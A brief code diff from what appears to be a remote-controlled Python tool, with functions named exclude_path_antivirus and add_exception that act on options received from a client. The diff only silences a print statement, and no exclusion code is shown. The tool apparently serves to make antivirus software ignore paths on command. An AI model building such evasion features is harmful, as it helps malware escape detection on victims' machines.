@@ -1,6 +1,5 @@
 from core.utils import display_msg
 import subprocess
-
 import os
 import tempfile
 
@@ -25,7 +24,7 @@ def exclude_path_antivirus(dir_to_add):
 
 
 def add_exception(client):
-    print("Adding exception")
+    # print("Adding exception")
     # time.sleep(generate_random_int())
     option = client.receive_data()
     if option == "1":
